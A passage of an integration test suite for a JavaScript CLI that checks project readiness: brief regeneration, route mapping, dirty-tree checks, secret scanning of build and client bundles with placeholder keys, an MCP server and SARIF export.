    assert.ok(body.includes("getadvantage_brief: 1"), "frontmatter uses getadvantage key");

    // Hand-edit the protected block (what the finding said was eaten).
    const manual =
      "## Your notes (preserved across refreshes)\n" +
      "KEEP-ME-BRIEF-NOTES-v1 — ICP is Lovable founders; never drop this.\n" +
      "- decision: ship gate is the hero, AEO is supporting\n";
    body = body.replace(
      /<!-- getadvantage:brief:notes -->[\s\S]*?<!-- \/getadvantage:brief:notes -->/,
      `<!-- getadvantage:brief:notes -->\n${manual}<!-- /getadvantage:brief:notes -->`,
    );
    writeFileSync(briefPath, body, "utf8");

    // Also change a generated-looking section to prove non-notes content regenerates
    // (we only assert notes survive — generated map may change with git state).
    const r2 = run(["brief"], repo);
    assert.equal(r2.code, 0, r2.stderr);
    assert.ok(/preserved/i.test(r2.stdout), `should mention notes preserved:\n${r2.stdout}`);
    const after = readFileSync(briefPath, "utf8");
    assert.ok(
      after.includes("KEEP-ME-BRIEF-NOTES-v1"),
      "manual notes must survive regeneration (brief-eats-manual-edits)",
    );
    assert.ok(after.includes("ship gate is the hero"), "full notes body preserved");
    assert.ok(after.includes("## What this is"), "generated sections still present");

    // Legacy ship-safe markers must still preserve notes on upgrade (brand migrate).
    writeFileSync(
      briefPath,
      [
        "---",
        "ship_safe_brief: 1",
        "---",
        "",
        "<!-- ship-safe:project-brief -->",
        "",
        "# Old brief",
        "",
        "<!-- ship-safe:brief:notes -->",
        "LEGACY-NOTES-KEEP",
        "<!-- /ship-safe:brief:notes -->",
        "",
        "## What this is",
        "old generated body",
        "",
      ].join("\n"),
      "utf8",
    );
    const rLegacy = run(["brief"], repo);
    assert.equal(rLegacy.code, 0, rLegacy.stderr);
    const migrated = readFileSync(briefPath, "utf8");
    assert.ok(migrated.includes("LEGACY-NOTES-KEEP"), "legacy notes survive brand migration");
    assert.ok(migrated.includes("<!-- getadvantage:brief:notes -->"), "rewrites to new markers");
    assert.ok(migrated.includes("<!-- getadvantage:project-brief -->"), "rewrites to new banner");

    // Foreign PROJECT-BRIEF.md without our banner must refuse overwrite.
    writeFileSync(briefPath, "# Hand-written project brief\n\nDo not clobber.\n", "utf8");
    const r3 = run(["brief"], repo);
    assert.equal(r3.code, 1, "must refuse to overwrite a foreign brief");
    assert.ok(/refusing to overwrite/i.test(r3.stderr + r3.stdout), r3.stderr + r3.stdout);
    const foreign = readFileSync(briefPath, "utf8");
    assert.ok(foreign.includes("Do not clobber"), "foreign file must be untouched");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 26. map vs check — one parser, same routes (0.7.2)
// ---------------------------------------------------------------------------
scenario("map vs check: Next src/app/api and Express routes agree across commands", () => {
  const base = freshBase();
  try {
    // --- Next.js with src/app/api (common layout map used to miss) ----------
    const nextRepo = path.join(base, "next-src");
    initRepo(nextRepo);
    write(
      nextRepo,
      "package.json",
      JSON.stringify(
        { name: "next-src", version: "1.0.0", private: true, dependencies: { next: "15.0.0", react: "19.0.0" } },
        null,
        2,
      ) + "\n",
    );
    write(
      nextRepo,
      "src/app/api/hello/route.ts",
      `export async function GET() { return Response.json({ ok: true }); }\n` +
        `export async function POST() { return Response.json({ ok: true }); }\n`,
    );
    commitAll(nextRepo, "chore: next src app route");

    const nextMap = run(["map", "--json"], nextRepo);
    assert.equal(nextMap.code, 0, nextMap.stderr);
    const nextMapDoc = JSON.parse(nextMap.stdout);
    assert.equal(nextMapDoc.command, "map");
    const nextApiLane = (nextMapDoc.lanes || []).find((l) => /API surface/i.test(l.label));
    assert.ok(nextApiLane, "map JSON must include API surface lane");
    assert.ok(/1 route/.test(nextApiLane.detail), `map must see src/app route: ${nextApiLane.detail}`);

    const nextCheck = run(["check", "--json", "--no-brief-check"], nextRepo);
    assert.equal(nextCheck.code, 0, nextCheck.stderr);
    const nextCheckDoc = JSON.parse(nextCheck.stdout);
    const nextCheckApi = (nextCheckDoc.checks || []).find((c) => /API surface/i.test(c.label));
    assert.ok(nextCheckApi, "check must include API surface overview");
    assert.ok(/1 route/.test(nextCheckApi.detail), `check must see same route: ${nextCheckApi.detail}`);
    assert.equal(
      nextApiLane.detail.replace(/\s+/g, " "),
      nextCheckApi.detail.replace(/\s+/g, " "),
      "map and check API surface detail must match",
    );

    // --- Express: both must use the node parser (not Next-empty) ------------
    const exRepo = path.join(base, "express");
    initRepo(exRepo);
    write(
      exRepo,
      "package.json",
      JSON.stringify(
        { name: "ex", version: "1.0.0", private: true, dependencies: { express: "^4.0.0" }, scripts: { build: "node -e \"\"" } },
        null,
        2,
      ) + "\n",
    );
    write(
      exRepo,
      "server.js",
      `const express = require("express");\n` +
        `const app = express();\n` +
        `app.get("/health", (req, res) => res.send("ok"));\n` +
        `app.post("/api/pay", (req, res) => res.send("paid"));\n`,
    );
    commitAll(exRepo, "chore: express app");

    const exMap = run(["map", "--json"], exRepo);
    const exMapDoc = JSON.parse(exMap.stdout);
    const exMapApi = (exMapDoc.lanes || []).find((l) => /API surface/i.test(l.label));
    assert.ok(exMapApi && /2 route/.test(exMapApi.detail), `express map: ${exMapApi && exMapApi.detail}`);

    const exCheck = run(["check", "--json", "--no-brief-check"], exRepo);
    const exCheckDoc = JSON.parse(exCheck.stdout);
    const exCheckApi = (exCheckDoc.checks || []).find((c) => /API surface/i.test(c.label));
    assert.ok(exCheckApi && /2 route/.test(exCheckApi.detail), `express check: ${exCheckApi && exCheckApi.detail}`);
    assert.equal(
      exMapApi.detail.replace(/\s+/g, " "),
      exCheckApi.detail.replace(/\s+/g, " "),
      "express: map and check must agree",
    );
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 27. map --json is honoured (0.7.2)
// ---------------------------------------------------------------------------
scenario("map --json: emits one JSON document on stdout", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    const r = run(["map", "--json"], repo);
    assert.equal(r.code, 0, r.stderr);
    const doc = JSON.parse(r.stdout);
    assert.equal(doc.command, "map");
    assert.ok(Array.isArray(doc.lanes) && doc.lanes.length >= 3, "lanes present");
    assert.ok(doc.generatedAt, "timestamp present");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 28. typo → did you mean (0.7.2)
// ---------------------------------------------------------------------------
scenario("typo command: suggests a close match instead of dumping full help", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    const r = run(["chekc"], repo); // typo for check
    assert.equal(r.code, 1);
    const out = r.stderr + r.stdout;
    assert.ok(/Unknown command/i.test(out), out);
    assert.ok(/Did you mean/i.test(out) && /check/.test(out), `expected did-you-mean:\n${out}`);
    // Must NOT dump the full help catalogue.
    assert.ok(!/fan-out.*fan-in.*architecture/s.test(out), "must not dump full help");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 29. dirty-tree: own brain artifacts are not "scratch" risk alone (0.7.2)
// ---------------------------------------------------------------------------
scenario("dirty-tree: only PROJECT-BRIEF.md dirty → pass (own artifact), not scratch warn", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    // Generate brief (untracked) — the tool just told the user to create it.
    const b = run(["brief"], repo);
    assert.equal(b.code, 0, b.stderr);
    const r = run(["check", "--json", "--no-brief-check", "--no-overview"], repo);
    const doc = JSON.parse(r.stdout);
    const dirty = doc.checks.find((c) => /Dirty-tree/i.test(c.label));
    assert.ok(dirty, "dirty-tree check present");
    assert.equal(dirty.status, "pass", `own artifacts alone must pass: ${JSON.stringify(dirty)}`);
    assert.ok(/brain|marker|getAdvantage/i.test(dirty.detail), dirty.detail);
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 30. dirty-tree: a TRACKED edit to a seed file is NOT own-artifact churn (0.7.2 fix)
// ---------------------------------------------------------------------------
scenario("dirty-tree: a tracked edit to a seed file (CLAUDE.md) is not waved through as brain-file churn → NO-GO", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    write(repo, "CLAUDE.md", "# Project rules\n\nseeded by init.\n");
    commitAll(repo, "chore: seed CLAUDE.md");
    // Hand-edit the committed seed file (real work / tampering — the CLI does not
    // rewrite CLAUDE.md on a run, so this must not read as "expected after brief").
    write(repo, "CLAUDE.md", "# Project rules\n\nseeded by init.\nINJECTED LINE\n");
    const r = run(["check", "--json", "--no-brief-check", "--no-overview"], repo);
    assert.equal(r.code, 1, `tracked seed-file edit must NO-GO: ${r.stdout}${r.stderr}`);
    const doc = JSON.parse(r.stdout);
    const dirty = doc.checks.find((c) => /Dirty-tree/i.test(c.label));
    assert.ok(dirty, "dirty-tree check present");
    assert.equal(dirty.status, "fail", `tracked seed-file edit must fail, not pass: ${JSON.stringify(dirty)}`);
    // But a tracked in-place rewrite of PROJECT-BRIEF.md (regenerated every run)
    // stays informational — prove we didn't over-correct.
    const repo2 = scaffold(path.join(base, "two"));
    run(["brief"], repo2);
    commitAll(repo2, "chore: commit brief");
    run(["brief"], repo2); // regenerate → PROJECT-BRIEF.md is now tracked-modified
    const r2 = run(["check", "--json", "--no-brief-check", "--no-overview"], repo2);
    const doc2 = JSON.parse(r2.stdout);
    const dirty2 = doc2.checks.find((c) => /Dirty-tree/i.test(c.label));
    assert.notEqual(dirty2.status, "fail", `regenerated brief churn must not fail: ${JSON.stringify(dirty2)}`);
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 31. brief: a large (>cap) foreign brief is refused, never silently clobbered (0.7.2 fix)
// ---------------------------------------------------------------------------
scenario("brief: a large hand-written brief is refused, not silently overwritten (foreign-guard bypass)", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    const briefPath = path.join(repo, "PROJECT-BRIEF.md");
    const marker = "KEEP-THIS-LARGE-FOREIGN-BRIEF-v1";
    // >200 KB: the old 200 KB read cap made readTextSafe return "", so the guard
    // saw "no file" and clobbered it. Must now be preserved.
    writeFileSync(briefPath, `# Hand-written brief\n\n${marker}\n` + "x".repeat(260_000), "utf8");
    const r = run(["brief"], repo);
    assert.equal(r.code, 1, `must refuse to overwrite a foreign brief: ${r.stdout}${r.stderr}`);
    assert.ok(/refus/i.test(r.stderr + r.stdout), r.stderr + r.stdout);
    const after = readFileSync(briefPath, "utf8");
    assert.ok(after.includes(marker), "large foreign brief must be left untouched");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 32. secret scan: a committed key inside a build/ dir is scanned, not skipped (0.7.2 fix)
// ---------------------------------------------------------------------------
scenario("secret scan: a committed key inside a build/ dir is scanned → NO-GO (no silent dir skip)", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    // The classic `git add .` of bundled output with an embedded key.
    const fakeKey = "sk-proj-" + "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0";
    write(repo, "frontend/build/static/js/main.abc123.js", `var C={apiKey:"${fakeKey}"};\n`);
    commitAll(repo, "chore: commit build output with an embedded key");
    const r = run(["check", "--json", "--no-brief-check", "--no-overview"], repo);
    assert.equal(r.code, 1, `committed secret in build/ must NO-GO: ${r.stdout}`);
    const doc = JSON.parse(r.stdout);
    const sec = doc.checks.find((c) => /Secret scan/i.test(c.label));
    assert.ok(sec, "secret scan present");
    assert.equal(sec.status, "fail", `build/ secret must fail: ${JSON.stringify(sec)}`);
    assert.ok(!JSON.stringify(doc).includes(fakeKey), "the full key must never be echoed");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 33. secret scan: lockfiles + sourcemaps are scanned, not silently skipped (0.7.3 A4)
// ---------------------------------------------------------------------------
scenario("secret scan: a key committed in a lockfile or a .map sourcemap is caught → NO-GO", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    const key = "sk_live_" + "3".repeat(26);
    // A key pasted into a lockfile and into a bundle sourcemap — both used to be skipped.
    write(repo, "package-lock.json", `{"name":"x","lockfileVersion":3,"note":"${key}"}\n`);
    write(repo, "dist/bundle.js.map", `{"version":3,"sourcesContent":["const K='${key}';"]}\n`);
    write(repo, "public/logo.svg", `<svg><!-- ${key} --></svg>\n`);
    commitAll(repo, "chore: commit lockfile + sourcemap + svg carrying a key");
    const r = run(["check", "--json", "--no-brief-check", "--no-overview"], repo);
    assert.equal(r.code, 1, `key in lockfile/sourcemap must NO-GO: ${r.stdout}`);
    const doc = JSON.parse(r.stdout);
    const sec = doc.checks.find((cc) => /Secret scan/i.test(cc.label));
    assert.equal(sec.status, "fail", `must fail: ${JSON.stringify(sec)}`);
    const joined = JSON.stringify(doc);
    assert.ok(/package-lock\.json/.test(joined), "lockfile must be named as a hit");
    assert.ok(/bundle\.js\.map/.test(joined), "sourcemap must be named as a hit");
    assert.ok(!joined.includes(key), "full key never echoed");
    // A genuinely binary asset must still be skipped (no false positive / no crash).
    const clean = scaffold(path.join(base, "bin"));
    write(clean, "img/logo.png", "\x89PNG\r\n\x1a\n binary junk");
    commitAll(clean, "chore: png");
    const rc = run(["check", "--json", "--no-brief-check", "--no-overview"], clean);
    assert.equal(rc.code, 0, `binary-only repo must GO: ${rc.stdout}`);
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 45. client-bundle secret exposure (.next/static + Vite dist; public prefixes
//     are not an exemption for private material) — lane 0.9.x
// ---------------------------------------------------------------------------
scenario("secret scan: committed sk_live only in .next/static/** → NO-GO; full secret not printed", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    // Classic silent-GO hole: committed Next browser chunk with a live Stripe key.
    const key = "sk_live_" + "NEXTSTATICCHUNK0000000001";
    write(
      repo,
      ".next/static/chunks/app-pages-internals.js",
      `self.__next_f.push([1,"const STRIPE=\\"${key}\\";"]);\n`,
    );
    // Non-static .next internals must remain skipped (honest boundary).
    write(repo, ".next/cache/webpack/client-development/0.pack", `junk ${key} junk\n`);
    write(repo, ".next/server/app/page.js", `export const k="${key}";\n`);
    commitAll(repo, "chore: commit .next browser chunk with embedded live key");
    const r = run(["check", "--json", "--no-brief-check", "--no-overview"], repo);
    assert.equal(r.code, 1, `committed secret in .next/static must NO-GO: ${r.stdout}`);
    const doc = JSON.parse(r.stdout);
    const sec = doc.checks.find((c) => /Secret scan/i.test(c.label));
    assert.ok(sec, "secret scan present");
    assert.equal(sec.status, "fail", `.next/static secret must fail: ${JSON.stringify(sec)}`);
    const joined = JSON.stringify(doc);
    assert.ok(/\.next[\\/]static/.test(joined) || /app-pages-internals/.test(joined),
      `must name the static client asset:\n${joined.slice(0, 800)}`);
    assert.ok(!joined.includes(key), "the full secret must never be echoed in JSON");
    assert.ok(!(r.stdout + r.stderr).includes(key), "full secret must never appear in human output");
  } finally {
    cleanup(base);
  }
});

scenario("secret scan: sk_live in Vite dist asset or VITE_* assignment → NO-GO (prefix not exemption)", () => {
  const base = freshBase();
  try {
    // Case A: private key inside a committed Vite dist asset.
    const distRepo = scaffold(path.join(base, "dist-case"));
    const distKey = "sk_live_" + "VITEDISTBUNDLEKEY00000001";
    write(
      distRepo,
      "dist/assets/index-a1b2c3d4.js",
      `const __vite__={VITE_STRIPE_SECRET:"${distKey}"};\n`,
    );
    commitAll(distRepo, "chore: commit Vite dist with live key");
    const rd = run(["check", "--json", "--no-brief-check", "--no-overview"], distRepo);
    assert.equal(rd.code, 1, `committed secret in dist/ must NO-GO: ${rd.stdout}`);
    const ddoc = JSON.parse(rd.stdout);
    const dsec = ddoc.checks.find((c) => /Secret scan/i.test(c.label));
    assert.equal(dsec.status, "fail", `dist secret must fail: ${JSON.stringify(dsec)}`);
    assert.ok(!JSON.stringify(ddoc).includes(distKey), "full dist secret never echoed");

    // Case B: private key under a VITE_* name in source — prefix alone is not safe.
    const viteRepo = scaffold(path.join(base, "vite-case"));
    const viteKey = "sk_live_" + "VITEPREFIXLIVEKEY00000001";
    write(
      viteRepo,
      "src/env.js",
      `export const VITE_STRIPE_SECRET_KEY = "${viteKey}";\n`,
    );
    commitAll(viteRepo, "chore: VITE_ name holding a private live key");
    const rv = run(["check", "--json", "--no-brief-check", "--no-overview"], viteRepo);
    assert.equal(rv.code, 1, `VITE_*-named private key must NO-GO: ${rv.stdout}`);
    const vdoc = JSON.parse(rv.stdout);
    const vsec = vdoc.checks.find((c) => /Secret scan/i.test(c.label));
    assert.equal(vsec.status, "fail", `VITE_ private material must fail: ${JSON.stringify(vsec)}`);
    assert.ok(!JSON.stringify(vdoc).includes(viteKey), "full VITE_ secret never echoed");
  } finally {
    cleanup(base);
  }
});

scenario("secret scan: intentional public client config (VITE_/NEXT_PUBLIC_) alone is not a secret NO-GO", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    // Values deliberately do NOT match private secret regexes (no sk_live, no JWT
    // header shape, no PEM, etc.). Proves the public *name* is not a finding.
    write(
      repo,
      ".env.local.example",
      [
        "VITE_SUPABASE_URL=https://xyzcompany.supabase.co",
        "NEXT_PUBLIC_SUPABASE_ANON_KEY=public-anon-placeholder-not-a-secret",
        "NEXT_PUBLIC_APP_NAME=demo-client",
        "",
      ].join("\n"),
    );
    write(
      repo,
      "src/client-config.js",
      [
        'export const VITE_SUPABASE_URL = "https://xyzcompany.supabase.co";',
        'export const NEXT_PUBLIC_SUPABASE_ANON_KEY = "public-anon-placeholder-not-a-secret";',
        "",
      ].join("\n"),
    );
    commitAll(repo, "chore: intentional public client config only");
    const r = run(["check", "--json", "--no-brief-check", "--no-overview"], repo);
    assert.equal(r.code, 0, `public client config alone must GO:\n${r.stdout}\n${r.stderr}`);
    const doc = JSON.parse(r.stdout);
    const sec = doc.checks.find((c) => /Secret scan/i.test(c.label));
    assert.ok(sec, "secret scan present");
    assert.equal(sec.status, "pass", `must not secret-NO-GO on public prefixes alone: ${JSON.stringify(sec)}`);
  } finally {
    cleanup(base);
  }
});

scenario("secret scan: key only under .next/cache (non-static) stays honest-skip; no claim of coverage", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    const key = "sk_live_" + "NEXTCACHEONLYSKIP00000001";
    // Only non-static .next paths — scanner must NOT pretend to cover these.
    write(repo, ".next/cache/webpack/client-development/1.pack", `packed ${key}\n`);
    write(repo, ".next/server/chunks/ssr.js", `module.exports={k:"${key}"};\n`);
    commitAll(repo, "chore: secret only in non-static .next paths");
    const r = run(["check", "--json", "--no-brief-check", "--no-overview"], repo);
    assert.equal(r.code, 0, `non-static .next alone must not be claimed covered (GO):\n${r.stdout}`);
    const doc = JSON.parse(r.stdout);
    const sec = doc.checks.find((c) => /Secret scan/i.test(c.label));
    assert.equal(sec.status, "pass", JSON.stringify(sec));
    assert.ok(!JSON.stringify(doc).includes(key), "full secret must never be echoed");
  } finally {
    cleanup(base);
  }
});

scenario("packed package: cold install catches .next/static + dist secrets; public config GO", () => {
  const base = freshBase();
  try {
    const pkgRoot = path.join(__dirname, "..");
    const packDir = path.join(base, "pack");
    mkdirSync(packDir, { recursive: true });
    execFileSync("npm", ["pack", pkgRoot, "--pack-destination", packDir], {
      cwd: packDir,
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"],
      shell: process.platform === "win32",
    });
    const tgz = path.join(packDir, readdirPack(packDir));
    assert.ok(existsSync(tgz), `expected tarball in ${packDir}`);
    const listing = execFileSync("tar", ["-tzf", tgz], { encoding: "utf8" });
    assert.ok(
      listing.includes("package/checks.mjs") || listing.replace(/\\/g, "/").includes("package/checks.mjs"),
      "tarball must include checks.mjs",
    );

    const cold = path.join(base, "cold");
    mkdirSync(cold, { recursive: true });
    execFileSync("npm", ["install", "--ignore-scripts", tgz], {
      cwd: cold,
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"],
      shell: process.platform === "win32",
    });
    const bin = path.join(cold, "node_modules", "getadvantage", "index.mjs");
    assert.ok(existsSync(bin), "packed index.mjs must install");

    // Cold: .next/static secret → NO-GO, redacted
    const nextSample = path.join(base, "sample-next");
    initRepo(nextSample);
    write(nextSample, "package.json", '{"name":"cold-next","version":"1.0.0","private":true}\n');
    const nextKey = "sk_live_" + "COLDNEXTSTATICSECRET00001";
    write(
      nextSample,
      ".next/static/chunks/main-app.js",
      `window.__ENV={stripe:"${nextKey}"};\n`,
    );
    commitAll(nextSample, "chore: cold .next/static secret");
    const rNext = spawnSync(
      process.execPath,
      [bin, "check", "--json", "--no-brief-check", "--no-overview"],
      { cwd: nextSample, encoding: "utf8", env: buildEnv(), timeout: 120_000 },
    );
    assert.equal(rNext.status, 1, `cold .next/static must NO-GO:\n${rNext.stderr}\n${rNext.stdout}`);
    assert.ok(!((rNext.stdout || "") + (rNext.stderr || "")).includes(nextKey), "cold: full next secret absent");
    const nextDoc = JSON.parse(rNext.stdout);
    const nextSec = nextDoc.checks.find((c) => /Secret scan/i.test(c.label));
    assert.equal(nextSec.status, "fail");

    // Cold: dist secret → NO-GO
    const distSample = path.join(base, "sample-dist");
    initRepo(distSample);
    write(distSample, "package.json", '{"name":"cold-dist","version":"1.0.0","private":true}\n');
    const distKey = "sk_live_" + "COLDDISTBUNDLESECRET00001";
    write(distSample, "dist/assets/index.js", `export const k="${distKey}";\n`);
    commitAll(distSample, "chore: cold dist secret");
    const rDist = spawnSync(
      process.execPath,
      [bin, "check", "--json", "--no-brief-check", "--no-overview"],
      { cwd: distSample, encoding: "utf8", env: buildEnv(), timeout: 120_000 },
    );
    assert.equal(rDist.status, 1, `cold dist must NO-GO:\n${rDist.stderr}\n${rDist.stdout}`);
    assert.ok(!((rDist.stdout || "") + (rDist.stderr || "")).includes(distKey), "cold: full dist secret absent");

    // Cold: public client config alone → GO
    const pubSample = path.join(base, "sample-public");
    initRepo(pubSample);
    write(pubSample, "package.json", '{"name":"cold-pub","version":"1.0.0","private":true}\n');
    write(
      pubSample,
      "src/config.js",
      'export const VITE_SUPABASE_URL="https://xyzcompany.supabase.co";\n' +
        'export const NEXT_PUBLIC_SUPABASE_ANON_KEY="public-anon-placeholder-not-a-secret";\n',
    );
    commitAll(pubSample, "chore: cold public config");
    const rPub = spawnSync(
      process.execPath,
      [bin, "check", "--json", "--no-brief-check", "--no-overview"],
      { cwd: pubSample, encoding: "utf8", env: buildEnv(), timeout: 120_000 },
    );
    assert.equal(rPub.status, 0, `cold public config must GO:\n${rPub.stderr}\n${rPub.stdout}`);
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 34. outside-git error points to a next step (0.7.3 A2)
// ---------------------------------------------------------------------------
scenario("outside git: the error offers demo + git init instead of a dead-end", () => {
  const base = freshBase();
  try {
    const dir = path.join(base, "nogit");
    mkdirSync(dir, { recursive: true });
    write(dir, "package.json", '{"name":"x","version":"1.0.0"}\n');
    const r = run(["check"], dir);
    assert.equal(r.code, 1, "still exits 1 outside a git repo");
    const out = r.stderr + r.stdout;
    assert.ok(/demo/i.test(out), `must point to demo: ${out}`);
    assert.ok(/git init/i.test(out), `must point to git init: ${out}`);
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 35. client-only React/Vite map: no Express/Fastify jargon, friendly empty line (0.7.3 A1)
// ---------------------------------------------------------------------------
scenario("map on a client-only React/Vite app: de-jargoned, friendly empty-SPA line", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base, { pkg: { dependencies: { react: "^19.0.0" }, devDependencies: { vite: "^5.0.0" } } });
    write(repo, "index.html", "<div id=root></div>");
    write(repo, "src/App.jsx", "export default function App(){return null}");
    commitAll(repo, "chore: vite react spa");
    const r = run(["map"], repo);
    const out = r.stdout + r.stderr;
    assert.ok(!/Express\/Fastify|Flask\/FastAPI/.test(out), `no backend jargon for a React user: ${out}`);
    assert.ok(/client-side|client-only|nothing server-side/i.test(out), `friendly empty-SPA copy expected: ${out}`);
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 36. MCP live protocol: tools/list exposes map + architecture; tools/call map
//     returns the real API-surface text (0.8.1)
// ---------------------------------------------------------------------------
scenario("mcp: tools/list has 8 tools incl. map + architecture; tools/call map X-rays an Express repo", () => {
  const base = freshBase();
  try {
    const repo = path.join(base, "sample");
    initRepo(repo);
    write(repo, "package.json", '{"name":"mcp-sample","version":"1.0.0","dependencies":{"express":"^4.19.0"}}\n');
    write(repo, "server.js", [
      "const express = require('express');",
      "const app = express();",
      "app.get('/items', (req, res) => res.json([]));",
      "app.post('/items', (req, res) => res.status(201).end());",
      "app.listen(3000);",
    ].join("\n"));
    commitAll(repo, "chore: express sample");

    const lines =
      [
        JSON.stringify({ jsonrpc: "2.0", id: 1, method: "initialize", params: {} }),
        JSON.stringify({ jsonrpc: "2.0", id: 2, method: "tools/list" }),
        JSON.stringify({ jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "map", arguments: { cwd: repo } } }),
        JSON.stringify({ jsonrpc: "2.0", id: 4, method: "tools/call", params: { name: "architecture", arguments: { cwd: repo, top: 3 } } }),
      ].join("\n") + "\n";
    const r = spawnSync(process.execPath, [INDEX, "mcp"], {
      cwd: repo,
      input: lines,
      encoding: "utf8",
      maxBuffer: 64 * 1024 * 1024,
      timeout: 120_000,
      env: buildEnv(),
    });
    assert.equal(r.status, 0, `mcp server must exit 0 on stdin close:\n${r.stderr}`);

    const replies = r.stdout.split("\n").filter(Boolean).map((l) => JSON.parse(l));
    const byId = (id) => replies.find((m) => m.id === id);

    const tools = byId(2).result.tools.map((t) => t.name);
    assert.deepEqual(
      [...tools].sort(),
      ["architecture", "check", "gauge", "get_brief", "get_handoff", "map", "refresh_brief", "save_handoff"],
      `tool catalogue must be exactly the 8 tools: ${tools.join(", ")}`,
    );

    const mapText = byId(3).result.content[0].text;
    assert.ok(!byId(3).result.isError, `map tool must not error:\n${mapText}`);
    assert.ok(/API surface map/.test(mapText), `map text must include the API lane:\n${mapText}`);
    assert.ok(/\/items/.test(mapText) && /POST/.test(mapText), `map must find the Express routes:\n${mapText}`);
    assert.ok(/mutates but no auth\/session check found/.test(mapText), `ungated POST must be flagged:\n${mapText}`);

    const archText = byId(4).result.content[0].text;
    assert.ok(!byId(4).result.isError, `architecture tool must not error:\n${archText}`);
    assert.ok(/Signal band:/.test(archText), `architecture must report its signal band:\n${archText}`);

    // stdout is the protocol channel — every line must be JSON-RPC, no leaked prose.
    for (const line of r.stdout.split("\n").filter(Boolean)) {
      assert.ok(line.startsWith("{"), `non-JSON leaked onto the protocol channel: ${line.slice(0, 80)}`);
    }
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 37. SARIF 2.1 export (0.8.4) — hostile paths
// ---------------------------------------------------------------------------
scenario("sarif: clean GO writes valid SARIF 2.1 with tool name/version; exit 0", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    const out = path.join(repo, "out", "clean.sarif");
    const r = run(["check", "--json", "--no-brief-check", "--no-overview", "--sarif", out], repo);
    assert.equal(r.code, 0, `clean must GO:\n${r.stderr}\n${r.stdout}`);
    const doc = JSON.parse(r.stdout);
    assert.equal(doc.verdict, "GO");
    assert.ok(existsSync(out), "SARIF file must exist");
    const sarif = JSON.parse(readFileSync(out, "utf8"));
    assert.equal(sarif.version, "2.1.0");
    assert.ok(Array.isArray(sarif.runs) && sarif.runs.length === 1);
    const run0 = sarif.runs[0];
    assert.equal(run0.tool.driver.name, "getAdvantage");
    assert.equal(run0.tool.driver.version, JSON.parse(readFileSync(path.join(__dirname, "..", "package.json"), "utf8")).version);
    assert.ok(Array.isArray(run0.results));
    // Clean GO: no fail/warn findings required (empty results is valid).
    assert.equal(run0.invocations[0].exitCode, 0);
  } finally {
    cleanup(base);
  }
});

scenario("sarif: committed secret → NO-GO, SARIF has error + stable rule id; fixture secret absent", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    // Distinct fixture — must never appear in SARIF serialization.
    const secret = "sk_live_" + "SARIFHOSTILEKEY9x8y7z6w5v4u";
    write(repo, "src/leak.js", `// bad\nexport const k = "${secret}";\n`);
    commitAll(repo, "chore: commit hostile secret");
    const out = path.join(repo, "hostile.sarif");
    const r = run(["check", "--json", "--no-brief-check", "--no-overview", "--sarif", out], repo);
    assert.equal(r.code, 1, `must NO-GO:\n${r.stderr}\n${r.stdout}`);
    const doc = JSON.parse(r.stdout);
    assert.equal(doc.verdict, "NO-GO");
    // Human + json still work
    const sec = doc.checks.find((cc) => /Secret scan/i.test(cc.label));
    assert.equal(sec.status, "fail");
    assert.ok(!JSON.stringify(doc).includes(secret), "full secret must not appear in --json");

    const raw = readFileSync(out, "utf8");
    assert.ok(!raw.includes(secret), "full secret must not appear anywhere in SARIF file");
    const sarif = JSON.parse(raw);
    assert.equal(sarif.version, "2.1.0");
    const results = sarif.runs[0].results;
    assert.ok(results.length >= 1, "must emit at least one SARIF result");
    const secretResults = results.filter((x) => String(x.ruleId).startsWith("secret/"));
    assert.ok(secretResults.length >= 1, `expected secret/* rule: ${JSON.stringify(results)}`);
    assert.ok(
      secretResults.some((x) => x.ruleId === "secret/stripe-live"),
      `stable rule id secret/stripe-live expected: ${secretResults.map((x) => x.ruleId).join(",")}`,
    );
    assert.ok(secretResults.every((x) => x.level === "error"));
    const rules = sarif.runs[0].tool.driver.rules || [];
    const stripeRule = rules.find((rr) => rr.id === "secret/stripe-live");
    assert.ok(stripeRule, "driver.rules must list stable id");
    // Hostile: secret findings MUST carry security-severity + security tag
    assert.ok(
      stripeRule.properties && stripeRule.properties["security-severity"],
      "secret rule must have security-severity",
    );
    assert.ok(
      Array.isArray(stripeRule.properties.tags) && stripeRule.properties.tags.includes("security"),
      `secret rule must include security tag: ${JSON.stringify(stripeRule.properties?.tags)}`,
    );
    // Location + region when defensible
    const withLoc = secretResults.find((x) => x.locations?.[0]?.physicalLocation?.artifactLocation?.uri);
    assert.ok(withLoc, "artifact location required");
    assert.ok(/leak\.js/.test(withLoc.locations[0].physicalLocation.artifactLocation.uri));
    const region = withLoc.locations[0].physicalLocation.region;
    if (region) {
      assert.ok(region.startLine >= 1, "startLine 1-based when present");
    }
